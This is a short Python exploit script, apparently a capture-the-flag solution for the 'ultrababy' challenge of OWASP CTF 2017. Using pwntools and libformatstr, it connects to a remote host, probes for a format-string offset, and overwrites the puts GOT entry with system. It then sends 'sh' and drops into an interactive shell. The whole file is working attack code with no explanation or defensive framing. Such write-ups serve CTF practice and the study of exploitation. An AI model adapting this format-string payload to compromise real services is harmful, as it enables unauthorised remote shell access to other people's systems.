#!/usr/bin/python

#OWASPCTF 2017
#ultrababy exploit Code
#Abdeljalil Nouiri

from libformatstr import *
from pwn import *
import sys

con = remote(sys.argv[1],int(sys.argv[2]))

#con = process('./ultrababy')

putsgot = 0x0804a018
system = 0x08048480

bufsize = 50

lol = make_pattern(bufsize)

con.send(lol+"\n")

data = con.recv()                                 
offset, padding = guess_argnum(data, bufsize)

log.info("offset : " + str(offset))
log.info("padding: " + str(padding))
con.close()


con = remote(sys.argv[1],int(sys.argv[2]))
#con = process('./ultrababy')

p = FormatStr(bufsize)
p[putsgot] = system

buf = ""
buf += p.payload(offset, padding)  

con.send(buf+"\n")
con.send("sh\n")
con.interactive("\nPwned$ ")
